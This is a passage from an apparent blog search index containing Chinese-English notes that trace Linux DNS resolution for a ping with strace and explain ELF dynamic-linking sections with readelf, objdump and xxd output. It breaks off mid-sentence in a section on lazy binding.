mint21","linux-上-dns-解析流程#linux 上 DNS 解析流程":" 以 ping -c 1 baidu.com 为例 ping strace 日志，分析 ping 如何拿到 baidu.com 的 IP, 向目标 IP 发送 ICMP sudo strace -f -o ping.log -e trace=execve,access,openat,socket,connect,newfstatat,sendmmsg,recvfrom,sendto,recvmsg,write ping -c 1 baidu.com 1. Start the ping Process execve(\"/usr/bin/ping\", [\"ping\", \"-c\", \"1\", \"baidu.com\"], 0x7ffce9f3de88 /* 26 vars */) = 0 The ping command begins execution. 2. Load Required Libraries openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libc.so.6\", O_RDONLY|O_CLOEXEC) = 3 openat(AT_FDCWD, \"/lib/x86_64-linux-gnu/libidn2.so.0\", O_RDONLY|O_CLOEXEC) = 3 Libraries like libc (C standard library) and libidn2 (Internationalized Domain Names) are loaded for DNS resolution and string handling. 处理国际化, 非英文字母的域名 3. Check for nscd (Name Service Cache Daemon) 检查缓存 connect(5, {sa_family=AF_UNIX, sun_path=\"/var/run/nscd/socket\"}, 110) = -1 ENOENT (No such file or directory) The system tries to use nscd for cached DNS lookups but fails because /var/run/nscd/socket does not exist. This means caching is disabled or nscd is not running. 查看 nscd DNS 缓存, 这个服务默认没有安装 4. Read /etc/nsswitch.conf 获取 DNS 解析服务顺序 openat(AT_FDCWD, \"/etc/nsswitch.conf\", O_RDONLY|O_CLOEXEC) = 5 The system reads the Name Service Switch (NSS) configuration. This file defines the order of name resolution services (e.g., files for /etc/hosts, dns for DNS). 定义了 DNS 解析服务的顺序 /etc/nsswitch.conf 内容 # /etc/nsswitch.conf # # Example configuration of GNU Name Service Switch functionality. # If you have the `glibc-doc-reference' and `info' packages installed, try: # `info libc \"Name Service Switch\"' for information about this file. passwd: files systemd group: files systemd shadow: files systemd gshadow: files systemd hosts: files mdns4_minimal [NOTFOUND=return] dns myhostname networks: files protocols: db files services: db files ethers: db files rpc: db files netgroup: nis 1. hosts: Line hosts: files mdns4_minimal [NOTFOUND=return] dns myhostname Order of resolution-DNS 解析核心逻辑:\nfiles: Check /etc/hosts first (static hostname-to-IP mappings). mdns4_minimal: Use multicast DNS (mDNS) for .local names IPv4-only (common for local network devices). [NOTFOUND=return]: If mDNS returns “not found,” stop here and don’t proceed to dns or myhostname. dns: Use DNS (configured in /etc/resolv.conf). myhostname: Resolve the local machine’s hostname to its IP addresses (loopback and network interfaces). Implications:\nFor regular domains (e.g., baidu.com): mDNS is skipped (since it’s not .local), so DNS is used directly. For .local names: mDNS is prioritized, and DNS is ignored if mDNS fails. Security: Prevents DNS fallback for mDNS queries, avoiding potential conflicts. 2. passwd, group, shadow Lines passwd: files systemd group: files systemd shadow: files systemd Sources: files: Read from /etc/passwd, /etc/group, and /etc/shadow. systemd: Integrates with systemd for dynamic users (e.g., containerized services or transient users). Use Case: Ensures compatibility with modern systems using systemd-managed users (e.g., Docker containers). 3. netgroup Line netgroup: nis NIS (Network Information Service): Legacy protocol for centralized user/group management. Warning: NIS is insecure (plaintext communication). If unused, consider removing this line to avoid unnecessary risks. How This Affects DNS Resolution? 1. DNS Lookup Path For baidu.com (non-.local domain): Check /etc/hosts → No match. Skip mdns4_minimal (not relevant for baidu.com). Query DNS via systemd-resolved (uses /etc/resolv.conf). Fallback to myhostname only if DNS fails (unlikely). 2. /etc/resolv.conf Integration The dns source uses settings from /etc/resolv.conf (e.g., nameserver 127.0.0.53 for systemd-resolved). systemd-resolved acts as a local DNS stub resolver, handling: DNSSEC validation. Caching. Split DNS (for VPNs). Check /etc/hosts openat(AT_FDCWD, \"/etc/hosts\", O_RDONLY|O_CLOEXEC) = 5 The system checks /etc/hosts for a static entry for baidu.com. If found, it skips DNS. No match is found here. 在这个文件里寻找目标域名的 IP, 找到之后返回 5. Read /etc/resolv.conf openat(AT_FDCWD, \"/etc/resolv.conf\", O_RDONLY|O_CLOEXEC) = 5 读取 DNS 解析器配置文件, 真正的配置在 /run/systemd/resolve/stub-resolv.conf\ndynamic DNS configuration file managed by systemd-resolved, the local DNS stub resolver. It serves as the system’s primary DNS resolver configuration, ensuring applications route DNS queries through systemd-resolved for features like caching, DNSSEC validation, and split DNS (e.g., for VPNs). systemd-resolved local DNS stub resolver systemctl status systemd-resolved.service ● systemd-resolved.service - Network Name Resolution Loaded: loaded (/usr/lib/systemd/system/systemd-resolved.service; enabled; preset: enabled) Active: active (running) since Sat 2025-05-24 15:09:18 CST; 58min ago Docs: man:systemd-resolved.service(8) man:org.freedesktop.resolve1(5) https://www.freedesktop.org/wiki/Software/systemd/writing-network-configuration-managers https://www.freedesktop.org/wiki/Software/systemd/writing-resolver-clients Main PID: 622 (systemd-resolve) Status: \"Processing requests...\" Tasks: 1 (limit: 4545) Memory: 7.5M (peak: 8.0M) CPU: 269ms CGroup: /system.slice/systemd-resolved.service └─622 /usr/lib/systemd/systemd-resolved /etc/resolv.conf 内容 # Run \"resolvectl status\" to see details about the uplink DNS servers # currently in use. # # Third party programs should typically not access this file directly, but only # through the symlink at /etc/resolv.conf. To manage man:resolv.conf(5) in a # different way, replace this symlink by a static file or a different symlink. # # See man:systemd-resolved.service(8) for details about the supported modes of # operation for /etc/resolv.conf. nameserver 127.0.0.53 options edns0 trust-ad search localdomain 1. nameserver 127.0.0.53 Purpose: All DNS queries from applications are sent to this local DNS stub resolver. 127.0.0.53 is a special loopback address used exclusively by systemd-resolved. The resolver listens on this address to handle queries from applications. Why Not a Public DNS Server? Applications don't communicate directly with public DNS servers (e.g., 8.8.8.8). Instead, they send queries to 127.0.0.53, and systemd-resolved forwards them to upstream DNS servers configured elsewhere. 连接测试 nc -zv 127.0.0.53 53 Connection to 127.0.0.53 53 port [tcp/domain] succeeded! 2. options edns0 trust-ad edns0: Enables EDNS(0) (Extension Mechanisms for DNS), allowing larger UDP packets (up to 4096 bytes instead of 512 bytes). Required for DNSSEC and modern DNS features like DNS over TLS (DoT). trust-ad: Tells the resolver to trust the AD (Authentic Data) bit in DNS responses. When DNSSEC validation is enabled, systemd-resolved validates DNS responses and sets the AD bit if valid. This option ensures applications trust the resolver’s validation results. 3. search localdomain Purpose: Defines the search domain for unqualified hostnames (e.g., resolving myhost to myhost.localdomain). Behavior: If you run ping myhost, the resolver will attempt: myhost myhost.localdomain Avoids needing to type full FQDNs (Fully Qualified Domain Names) in local networks. 6. Query DNS via systemd-resolved socket(AF_INET, SOCK_DGRAM|SOCK_CLOEXEC|SOCK_NONBLOCK, IPPROTO_IP) = 5 connect(5, {sa_family=AF_INET, sin_port=htons(53), sin_addr=inet_addr(\"127.0.0.53\")}, 16) = 0 sendmmsg(5, [{msg_hdr={...}, msg_len=38}, ...], 2, MSG_NOSIGNAL) = 2 A UDP socket is created to communicate with the DNS resolver (127.0.0.53:53). Two DNS queries are sent: A record query (IPv4 address) for baidu.com. AAAA record query (IPv6 address) for baidu.com. upstream DNS servers 上游的 DNS 服务器 upstream DNS servers is external DNS servers that local DNS resolver forwards queries to for resolution\nThe actual upstream DNS servers (e.g., your ISP’s DNS or 1.1.1.1) /etc/systemd/resolved.conf (static configuration). Dynamically via DHCP or VPN managers (e.g., NetworkManager). 查看 upstream DNS 解析器信息 resolvectl status Global Protocols: -LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported resolv.conf mode: stub Link 2 (ens33) Current Scopes: DNS Protocols: +DefaultRoute -LLMNR -mDNS -DNSOverTLS DNSSEC=no/unsupported Current DNS Server: 172.16.222.2 DNS Servers: 172.16.222.2 DNS Domain: localdomain 注意 resolv.conf mode: stub Current DNS Server 就是上游的 DNS 服务器\n7. Receive DNS Responses recvfrom(5, \"\\266L\\201\\200\\0\\1\\0\\2\\0\\0\\0\\1\\5baidu\\3com\\0\\0\\1\\0\\1\\300\\f\\0\\1\\0...\", 2048, 0, ...) = 70 recvfrom(5, \"\\261e\\201\\200\\0\\1\\0\\0\\0\\1\\0\\1\\5baidu\\3com\\0\\0\\34\\0\\1\\300\\f\\0\\6\\0...\", 65536, 0, ...) = 81 The DNS resolver returns: A record: 39.156.66.10 (IPv4 address for baidu.com). AAAA record: 2400:cb00:2048:1::681b:8093 (IPv6 address, but not shown in strace output). The ping command uses the IPv4 address 39.156.66.10 for the ICMP echo request. 8. Final Output write(1, \"PING baidu.com (39.156.66.10) 56\"..., 52) = 52 The resolved IP address is printed, and ping sends an ICMP packet to 39.156.66.10. Key Files and Services Involved /etc/nsswitch.conf: Controls the order of name resolution (e.g., files → dns). /etc/resolv.conf: Specifies DNS servers (e.g., 127.0.0.53 for systemd-resolved). systemd-resolved: A local DNS stub resolver that handles queries and caches results. /etc/hosts: Static hostname-to-IP mappings (bypasses DNS if a match exists). ","references#References":" systemd-resolved.service nsswitch.conf gai.conf resolv.conf resolvectl Systemd-resolved ","本文总结#本文总结":" /etc/nsswitch.conf 的 hosts 配置本机 DNS 服务查询的顺序, 即 /etc/hosts 文件等 systemd-resolved 就是传说中的 DNS stub dns resolver 由 stub dns resolver 发起的查询就是传说中的递归查询 ","本文目标#本文目标":" 弄懂在本机向外部的(上游的) DNS server 发出查询之前, 在本机的查询步骤是什么？ "},"title":"Master Dns Resolve Steps"},"/blog/master-elf-sections-dynamic-link/":{"data":{"":"","dynamic-linking-涉及到的-section#\u003cstrong\u003eDynamic Linking 涉及到的 section\u003c/strong\u003e":"","dynstr-section-分析#\u003ccode\u003e.dynstr section 分析\u003c/code\u003e":"","dynsym-section-分析#\u003ccode\u003e.dynsym section\u003c/code\u003e 分析":"Dynamic Linking 涉及到的 section Section Type Purpose Example Command .dynamic DYNAMIC Contains metadata for the dynamic linker (e.g., needed libraries, symbol tables, relocations). readelf -d demo .plt PROGBITS Procedure Linkage Table: Stubs for external function calls (e.g., printf). objdump -d demo .got / .got.plt PROGBITS Global Offset Table: Stores resolved addresses for functions and variables. objdump -R demo .dynsym DYNSYM Dynamic symbol table (subset of .symtab) for runtime symbol resolution. readelf -s demo .dynstr STRTAB String table for symbol names in .dynsym. readelf -p .dynstr demo .gnu.hash GNU_HASH Optimized hash table for fast symbol lookup (replaces legacy .hash). readelf -p .gnu.hash demo .rela.dyn RELA Relocations for global variables (e.g., message). readelf -r demo .rela.plt RELA Relocations for function calls (e.g., printf). readelf -r demo .init_array INIT_ARRAY Array of constructor functions (marked with __attribute__((constructor))). readelf -s demo .fini_array FINI_ARRAY Array of destructor functions (marked with __attribute__((destructor))). readelf -s demo .interp PROGBITS Path to the dynamic linker (e.g., /lib64/ld-linux-x86-64.so.2). readelf -p .interp demo symbol table 符号表分析 The objdump -t demo command displays the symbol table of the ELF executable demo. This table lists all symbols (functions, variables, sections, etc.) defined or referenced in the binary.\ndemo: file format elf64-x86-64 SYMBOL TABLE: 0000000000000000 l df *ABS*\t0000000000000000 Scrt1.o 000000000000038c l O .note.ABI-tag\t0000000000000020 __abi_tag 0000000000000000 l df *ABS*\t0000000000000000 crtstuff.c 00000000000010b0 l F .text\t0000000000000000 deregister_tm_clones 00000000000010e0 l F .text\t0000000000000000 register_tm_clones 0000000000001120 l F .text\t0000000000000000 __do_global_dtors_aux 0000000000004020 l O .bss\t0000000000000001 completed.0 0000000000003db0 l O .fini_array\t0000000000000000 __do_global_dtors_aux_fini_array_entry 0000000000001160 l F .text\t0000000000000000 frame_dummy 0000000000003da0 l O .init_array\t0000000000000000 __frame_dummy_init_array_entry 0000000000000000 l df *ABS*\t0000000000000000 demo.c 0000000000004028 l O .bss\t0000000000000004 count.1 0000000000004014 l O .data\t0000000000000004 local_static.0 0000000000000000 l df *ABS*\t0000000000000000 crtstuff.c 00000000000021f8 l O .eh_frame\t0000000000000000 __FRAME_END__ 0000000000000000 l df *ABS*\t0000000000000000 0000000000003dc0 l O .dynamic\t0000000000000000 _DYNAMIC 0000000000002078 l .eh_frame_hdr\t0000000000000000 __GNU_EH_FRAME_HDR 0000000000003fb0 l O .got\t0000000000000000 _GLOBAL_OFFSET_TABLE_ 0000000000004018 g O .data\t0000000000000008 message 0000000000000000 F *UND*\t0000000000000000 __libc_start_main@GLIBC_2.34 0000000000000000 w *UND*\t0000000000000000 _ITM_deregisterTMCloneTable 0000000000004000 w .data\t0000000000000000 data_start 0000000000000000 F *UND*\t0000000000000000 puts@GLIBC_2.2.5 0000000000004020 g .data\t0000000000000000 _edata 0000000000004010 g O .data\t0000000000000004 global_data 000000000000127c g F .fini\t0000000000000000 .hidden _fini 00000000000011d3 g F .text\t000000000000001a print_message 0000000000004024 g O .bss\t0000000000000004 global_bss 0000000000000000 F *UND*\t0000000000000000 printf@GLIBC_2.2.5 000000000000119f g F .text\t000000000000001a finalize 00000000000011b9 g F .text\t000000000000001a initialize 0000000000004000 g .data\t0000000000000000 __data_start 0000000000000000 w *UND*\t0000000000000000 __gmon_start__ 0000000000004008 g O .data\t0000000000000000 .hidden __dso_handle 0000000000002000 g O .rodata\t0000000000000004 _IO_stdin_used 0000000000004030 g .bss\t0000000000000000 _end 0000000000001080 g F .text\t0000000000000026 _start 0000000000001169 g F .text\t0000000000000036 counter 0000000000004020 g .bss\t0000000000000000 __bss_start 00000000000011ed g F .text\t000000000000008e main 0000000000004020 g O .data\t0000000000000000 .hidden __TMC_END__ 0000000000000000 w *UND*\t0000000000000000 _ITM_registerTMCloneTable 0000000000000000 w F *UND*\t0000000000000000 __cxa_finalize@GLIBC_2.2.5 0000000000001000 g F .init\t0000000000000000 .hidden _init General Format of Each Line Each line in the symbol table has the following format:\nADDRESS Binding TYPE SECTION SIZE NAME Key Fields in the Output Address (00000000000011d3)\nThe virtual memory address of the symbol (hexadecimal) For external/undefined symbols (*UND*), this is 0000000000000000 Binding (l, g, !, w, u)\nglobal(默认的)、local、weak binding l: Local symbol (not visible outside the file; e.g., static functions/variables). g: Global symbol (externally visible; e.g., main, printf). !: Weak symbol (lower precedence during linking; not shown here). w: Weak symbol (unresolved). 还没有解析 u: Unique global symbol (special case for symbol versioning). Type (df, O, F)\ndf: Debug file symbol (indicates source code filenames like demo.c). O: Object symbol (data variable, e.g., global_data). F: Function symbol (e.g., main, print_message). UND: Undefined symbol (external reference, must be resolved at link time). ABS: Absolute symbol (not associated with any section; e.g., constants). Section (*ABS*, .text, .data, .bss)\n*ABS*: Absolute address (no section). 不属于任何 section .text: Executable code (functions). 指令 .data: Initialized global/static variables. 初始化数据 .bss: Uninitialized global/static variables. 未初始化数据 .rodata: Read-only data (e.g., string literals). 只读数据 *UND*: Undefined section (symbol requires external linkage). 需要外部链接 Size (0000000000000004)\nSize of the symbol (in bytes, hexadecimal). For example, count.1 (a static variable) occupies 4 bytes. Name (main, printf@GLIBC_2.2.5)\nSymbol name. For external symbols, versioning (e.g., @GLIBC_2.2.5) indicates the required library version. Key Symbols 总结 Symbol Type Section Description _start gF .text Entry point of the program (CRT startup code). main gF .text Your main function. print_message gF .text A custom function defined in demo.c. global_data gO .data Initialized global variable. global_bss gO .bss Uninitialized global variable. message gO .data String literal (e.g., \"Hello, World!\"). puts@GLIBC_2.2.5 u UND *UND* External reference to puts from glibc. __libc_start_main UND *UND* CRT function to initialize the program. _edata, _end g .data, .bss Special symbols marking end of sections. Special Sections and Symbols crtstuff.c and Scrt1.o: Compiler-generated CRT (C Runtime) code for initialization/finalization. _ITM_*: Symbols for Intel Transactional Memory (unused unless compiling with -fgnu-tm). .init_array/.fini_array: Functions to run before/after main() (e.g., constructors/destructors). .eh_frame: Exception handling metadata (stack unwinding for exceptions or debugging). .got: Global Offset Table (for PIC/position-independent code). print_message 分析 00000000000011d3 g F .text 000000000000001a print_message Address: 0x11d3 (location of print_message in memory). Binding: F (function). Type: g (global), Section: .text (code section). Size: 0x1a (26 bytes). print_message 代码共 26bytes Name: print_message (自定义的函数). printf@GLIBC_2.2.5 分析 0000000000000000 F *UND* 0000000000000000 printf@GLIBC_2.2.5 Field Value Explanation Address 0000000000000000 Undefined symbols have no valid address (resolved at runtime). Binding (implicit g) Global binding (default for undefined symbols like printf). Not explicitly shown here. Type F Function (symbol is a function, not a variable). Section *UND* Undefined (external reference; resolved by the linker/loader). Size 0000000000000000 Size of the symbol (not applicable for undefined symbols). Name printf@GLIBC_2.2.5 Symbol name with versioning (from glibc). .dynstr section 分析 [ 7] .dynstr STRTAB 0000000000000498 00000498 0000000000000094 0000000000000000 A 0 0 1 .dynstr 二进制查看 xxd -s 0x498 -l 0x94 demo 00000498: 0070 7574 7300 5f5f 6c69 6263 5f73 7461 .puts.__libc_sta 000004a8: 7274 5f6d 6169 6e00 5f5f 6378 615f 6669 rt_main.__cxa_fi 000004b8: 6e61 6c69 7a65 0070 7269 6e74 6600 6c69 nalize.printf.li 000004c8: 6263 2e73 6f2e 3600 474c 4942 435f 322e bc.so.6.GLIBC_2. 000004d8: 322e 3500 474c 4942 435f 322e 3334 005f 2.5.GLIBC_2.34._ 000004e8: 4954 4d5f 6465 7265 6769 7374 6572 544d ITM_deregisterTM 000004f8: 436c 6f6e 6554 6162 6c65 005f 5f67 6d6f CloneTable.__gmo 00000508: 6e5f 7374 6172 745f 5f00 5f49 544d 5f72 n_start__._ITM_r 00000518: 6567 6973 7465 7254 4d43 6c6f 6e65 5461 egisterTMCloneTa 00000528: 626c 6500 ble. .dynstr 查看分析 .dynstr base = 0x498\nreadelf -p .dynstr demo String dump of section '.dynstr': [ 1] puts [ 6] __libc_start_main [ 18] __cxa_finalize [ 27] printf [ 2e] libc.so.6 [ 38] GLIBC_2.2.5 [ 44] GLIBC_2.34 [ 4f] _ITM_deregisterTMCloneTable [ 6b] __gmon_start__ [ 7a] _ITM_registerTMCloneTable [ 1] puts 距离 .dynstr 开始处偏移量为 1, 也就是 0x498 + 1 = 0x499。长度为 5。包含一个 NULL terminator .strtab section 分析 The .strtab section in an ELF file is the string table that stores null-terminated strings referenced by other sections, such as the symbol table (.symtab) and section names. These strings include:\nFunction names (e.g., main, printf) Variable names (e.g., global_data) Section names (e.g., .text, .data) Other identifiers used in the binary. It acts as a centralized repository for strings, allowing sections like .symtab to reference names via offsets (indices) into .strtab instead of embedding strings directly.\n.strtab section 字段解释 From your readelf -S demo output:\n[35] .strtab STRTAB 0000000000000000 00003978 0000000000000245 0000000000000000 0 0 1 Field Value Explanation Name .strtab String table for symbol/section names. Type STRTAB Indicates a string table. Address 0x0000000000000000 Not loaded into memory (no runtime use). Offset 0x00003978 File offset to the start of the string table (14,712 bytes into the file). Size 0x0000000000000245 (581 bytes) Total size of the string table. Entry Size 0x0000000000000000 Not applicable (strings are variable-length). Flags None No special flags (not allocated in memory). Link 0 Not linked to another section (standalone). Info 0 No additional metadata. Alignment 1 Byte-aligned (strings are stored contiguously). Key Concepts Purpose of .strtab:\nStores human-readable names for symbols and sections. Reduces redundancy by allowing multiple entries to reference the same string via offset. How Symbols Use .strtab:\nThe symbol table (.symtab) references .strtab using the st_name field. Example: A symbol like main in .symtab has an st_name value (e.g., 0x123), which is an offset into .strtab. String Encoding:\nStrings are null-terminated (\\0). The first byte (offset 0x0) is always an empty string (\"\"), used as a placeholder. Not Loaded at Runtime:\nThe .strtab section is not marked as allocatable (A flag), so it is not loaded into memory during program execution. It is primarily used during linking and debugging. .strtab 探析 readelf -p demo readelf -p .strtab demo String dump of section '.strtab': [ 1] Scrt1.o [ 9] __abi_tag [ 13] crtstuff.c [ 1e] deregister_tm_clones [ 33] __do_global_dtors_aux [ 49] completed.0 [ 55] __do_global_dtors_aux_fini_array_entry [ 7c] frame_dummy [ 88] __frame_dummy_init_array_entry [ a7] demo.c [ ae] count.1 [ b6] local_static.0 [ c5] __FRAME_END__ [ d3] _DYNAMIC [ dc] __GNU_EH_FRAME_HDR [ ef] _GLOBAL_OFFSET_TABLE_ [ 105] __libc_start_main@GLIBC_2.34 [ 122] _ITM_deregisterTMCloneTable [ 13e] puts@GLIBC_2.2.5 [ 14f] _edata [ 156] global_data [ 162] _fini [ 168] print_message [ 176] global_bss [ 181] printf@GLIBC_2.2.5 [ 194] finalize [ 19d] initialize [ 1a8] __data_start [ 1b5] __gmon_start__ [ 1c4] __dso_handle [ 1d1] _IO_stdin_used [ 1e0] _end [ 1e5] counter [ 1ed] __bss_start [ 1f9] main [ 1fe] __TMC_END__ [ 20a] _ITM_registerTMCloneTable [ 224] __cxa_finalize@GLIBC_2.2.5 [ 23f] _init Differences Between .strtab and .dynstr Feature .strtab .dynstr Used by .symtab (full symbol table) .dynsym (dynamic symbol table) Loaded at Runtime? No (not allocatable) Yes (used by dynamic linker) Purpose Debugging, static linking Dynamic linking Size Larger (includes all symbols) Smaller (subset for runtime) Why .strtab Matters Symbol Resolution:\nThe symbol table (.symtab) relies on .strtab to associate names (e.g., printf) with addresses. Debugging:\nTools like gdb and nm use .strtab to display human-readable names during debugging. Stripped Binaries:\nIf .strtab is removed (via strip), symbols lose their names, making reverse engineering harder. .strtab section 总结 .strtab is a string table storing names for symbols and sections. It is referenced by .symtab via offsets (e.g., st_name). Use readelf -p .strtab demo to view its contents. It is not loaded at runtime but is crucial for linking and debugging. .shstrtab section 分析 The .shstrtab section in an ELF file is the section header string table, which stores null-terminated strings representing the names of all sections in the binary. This section is critical for interpreting the section headers in the ELF file, as it allows tools like readelf, objdump, and debuggers to map numeric section indices to human-readable names (e.g., .text, .data, .bss). link 时使用。运行时不使用。\n.shstrtab section 字段解释 [36] .shstrtab STRTAB 0000000000000000 00003bbd 000000000000016a 0000000000000000 0 0 1 Field Value Explanation Name .shstrtab Section header string table. Type STRTAB Indicates a string table. Address 0x0000000000000000 Not loaded into memory (no runtime use). Offset 0x00003bbd File offset to the start of the string table (15,277 bytes into the file). Size 0x000000000000016a (362 bytes) Total size of the string table. Entry Size 0x0000000000000000 Not applicable (strings are variable-length). Flags None No special flags (not allocated in memory). Link 0 Not linked to another section (standalone). Info 0 No additional metadata. Alignment 1 Byte-aligned (strings are stored contiguously). Key Concepts Purpose of .shstrtab:\nStores section names as null-terminated strings. Allows section headers to reference names via offsets instead of embedding strings directly. Example: A section header for .text has an sh_name field pointing to the offset of .text in .shstrtab. Structure of Strings:\nStrings are null-terminated (\\0). The first byte (offset 0x0) is always an empty string (\"\"), used as a placeholder. Subsequent strings are concatenated, e.g.: [0x00] \"\" \\0 [0x01] \".text\" \\0 [0x06] \".data\" \\0 [0x0c] \".bss\" \\0 ... How Section Headers Use .shstrtab\nEach section header has an sh_name field, which is an offset into .shstrtab. Example: A section header with sh_name = 0x01 points to the string .text. Not Loaded at Runtime:\nThe .shstrtab section is not marked as allocatable (A flag), so it is not loaded into memory during program execution. It is primarily used during linking and analysis. .shstrtab 探析 readelf -p: Print String Table readelf -p .shstrtab demo String dump of section '.shstrtab': [ 1] .symtab [ 9] .strtab [ 11] .shstrtab [ 1b] .interp [ 23] .note.gnu.property [ 36] .note.gnu.build-id [ 49] .note.ABI-tag [ 57] .gnu.hash [ 61] .dynsym [ 69] .dynstr [ 71] .gnu.version [ 7e] .gnu.version_r [ 8d] .rela.dyn [ 97] .rela.plt [ a1] .init [ a7] .plt.got [ b0] .plt.sec [ b9] .text [ bf] .fini [ c5] .rodata [ cd] .eh_frame_hdr [ db] .eh_frame [ e5] .init_array [ f1] .fini_array [ fd] .dynamic [ 106] .data [ 10c] .bss [ 111] .comment [ 11a] .debug_aranges [ 129] .debug_info [ 135] .debug_abbrev [ 143] .debug_line [ 14f] .debug_str [ 15a] .debug_line_str This lists all section names stored in .shstrtab, such as: .interp (dynamic linker path) .note.gnu.property (security notes) .text, .data, .bss, .rodata, .plt, .got, etc. .shstrtab 二进制查看 xxd -s 0x3bbd -l 0x16a demo 00003bbd: 002e 7379 6d74 6162 002e 7374 7274 6162 ..symtab..strtab 00003bcd: 002e 7368 7374 7274 6162 002e 696e 7465 ..shstrtab..inte 00003bdd: 7270 002e 6e6f 7465 2e67 6e75 2e70 726f rp..note.gnu.pro 00003bed: 7065 7274 7900 2e6e 6f74 652e 676e 752e perty..note.gnu. 00003bfd: 6275 696c 642d 6964 002e 6e6f 7465 2e41 build-id..note.A 00003c0d: 4249 2d74 6167 002e 676e 752e 6861 7368 BI-tag..gnu.hash 00003c1d: 002e 6479 6e73 796d 002e 6479 6e73 7472 ..dynsym..dynstr 00003c2d: 002e 676e 752e 7665 7273 696f 6e00 2e67 ..gnu.version..g 00003c3d: 6e75 2e76 6572 7369 6f6e 5f72 002e 7265 nu.version_r..re 00003c4d: 6c61 2e64 796e 002e 7265 6c61 2e70 6c74 la.dyn..rela.plt 00003c5d: 002e 696e 6974 002e 706c 742e 676f 7400 ..init..plt.got. 00003c6d: 2e70 6c74 2e73 6563 002e 7465 7874 002e .plt.sec..text.. 00003c7d: 6669 6e69 002e 726f 6461 7461 002e 6568 fini..rodata..eh 00003c8d: 5f66 7261 6d65 5f68 6472 002e 6568 5f66 _frame_hdr..eh_f 00003c9d: 7261 6d65 002e 696e 6974 5f61 7272 6179 rame..init_array 00003cad: 002e 6669 6e69 5f61 7272 6179 002e 6479 ..fini_array..dy 00003cbd: 6e61 6d69 6300 2e64 6174 6100 2e62 7373 namic..data..bss 00003ccd: 002e 636f 6d6d 656e 7400 2e64 6562 7567 ..comment..debug 00003cdd: 5f61 7261 6e67 6573 002e 6465 6275 675f _aranges..debug_ 00003ced: 696e 666f 002e 6465 6275 675f 6162 6272 info..debug_abbr 00003cfd: 6576 002e 6465 6275 675f 6c69 6e65 002e ev..debug_line.. 00003d0d: 6465 6275 675f 7374 7200 2e64 6562 7567 debug_str..debug 00003d1d: 5f6c 696e 655f 7374 7200 _line_str. Why .shstrtab Matters Human-Readable Names:\nWithout .shstrtab, section headers would be numeric, making analysis harder. Efficient Storage:\nAvoids duplicating strings across section headers. Tool Compatibility:\nRequired by tools like readelf, objdump, and debuggers to interpret section headers. Binary Inspection:\nEssential for reverse engineering, debugging, and understanding ELF structure. .dynsym section 分析 The .dynsym section in an ELF file is the dynamic symbol table, which contains symbols required for dynamic linking (e.g., external functions like printf from libc). This section is crucial for resolving symbols at runtime. 运行时解析符号使用\n.dynsym section字段解释 From your readelf -S demo output:\n[ 6] .dynsym DYNSYM 00000000000003d8 000003d8 00000000000000c0 0000000000000018 A 7 1 8 Field Value Explanation Name .dynsym Dynamic symbol table. Type DYNSYM Indicates a dynamic symbol table. Address 0x00000000000003d8 Virtual address in memory. Offset 0x000003d8 File offset to the start of the section. Size 0x00000000000000c0 (192 bytes) Total size in bytes. Entry Size 0x0000000000000018 (24 bytes) Size of each symbol entry. Flags A (Alloc) Section occupies memory during execution. Link 7 Index of the .dynstr section (holds symbol names). Info 1 Number of local symbols (e.g., UND symbols). Alignment 8 Alignment requirement for the section. link=7 链接到 index = 【7】的 section Key Concepts Purpose of .dynsym:\nStores symbols needed for dynamic linking, such as: External functions (e.g., printf, puts). Global variables from shared libraries. Symbols are resolved by the dynamic linker (ld-linux.so) at runtime. Unlike the full symbol table (.symtab), .dynsym is a subset optimized for runtime use. Structure of Entries: Each entry in .dynsym is 24 bytes (0x18) long, with fields like:\nName: Offset into .dynstr for the symbol name (e.g., \"printf\"). Value: Symbol address (0 for unresolved symbols). Size: Size of the symbol (0 for functions). Type \u0026 Binding: Metadata (e.g., FUNC GLOBAL DEFAULT UND). Visibility: Symbol visibility (default, hidden, etc.). .dynsym 查看 1. readelf --dyn-syms readelf --dyn-syms demo Symbol table '.dynsym' contains 8 entries: Num: Value Size Type Bind Vis Ndx Name 0: 0000000000000000 0 NOTYPE LOCAL DEFAULT UND 1: 0000000000000000 0 FUNC GLOBAL DEFAULT UND _[...]@GLIBC_2.34 (2) 2: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_deregisterT[...] 3: 0000000000000000 0 FUNC GLOBAL DEFAULT UND puts@GLIBC_2.2.5 (3) 4: 0000000000000000 0 FUNC GLOBAL DEFAULT UND [...]@GLIBC_2.2.5 (3) 5: 0000000000000000 0 NOTYPE WEAK DEFAULT UND __gmon_start__ 6: 0000000000000000 0 NOTYPE WEAK DEFAULT UND _ITM_registerTMC[...] 7: 0000000000000000 0 FUNC WEAK DEFAULT UND [...]@GLIBC_2.2.5 (3) 2. objdump -T objdump -T demo demo: file format elf64-x86-64 DYNAMIC SYMBOL TABLE: 0000000000000000 DF *UND* 0000000000000000 (GLIBC_2.34) __libc_start_main 0000000000000000 w D *UND* 0000000000000000 Base _ITM_deregisterTMCloneTable 0000000000000000 DF *UND* 0000000000000000 (GLIBC_2.2.5) puts 0000000000000000 DF *UND* 0000000000000000 (GLIBC_2.2.5) printf 0000000000000000 w D *UND* 0000000000000000 Base __gmon_start__ 0000000000000000 w D *UND* 0000000000000000 Base _ITM_registerTMCloneTable 0000000000000000 w DF *UND* 0000000000000000 (GLIBC_2.2.5) __cxa_finalize How .dynsym Works in Dynamic Linking Symbol Resolution:\nThe dynamic linker uses .dynsym entries to locate symbols in shared libraries (e.g., printf in libc). Each symbol has a name (from .dynstr) and metadata (type, binding). Lazy Binding:\nWhen printf is first called, the PLT stub jumps to the GOT entry (.got). The GOT entry initially points to the resolver (in .plt), which triggers the dynamic linker to resolve the symbol. The dynamic linker uses .dynsym to look up printf and updates the GOT entry with its address in libc. Key Sections Involved:\n.dynsym: Contains unresolved symbols (e.g., printf). .dynstr: String table for symbol names (linked via .dynsym’s Link field). .rela.plt: Relocations for PLT entries (e.g., printf’s GOT offset). .got: Stores resolved addresses after dynamic linking. ","lazy-binding-是怎样工作的#lazy binding 是怎样工作的?":"demo 执行流程 The kernel loads /lib64/ld-linux-x86-64.so.2 (the dynamic linker). The dynamic linker loads libc.so.6 (used by printf). It resolves printf in libc and updates the GOT. Constructor initialize() runs before main(). Destructor finalize() runs after main() exits. lazy binding for the printf function in your code, using the readelf output and ELF mechanics. This process involves the Procedure Linkage Table (PLT), Global Offset Table (GOT), and the dynamic linker.\n1. Key Sections Involved Section Address Purpose .plt 0x1020 Stubs for 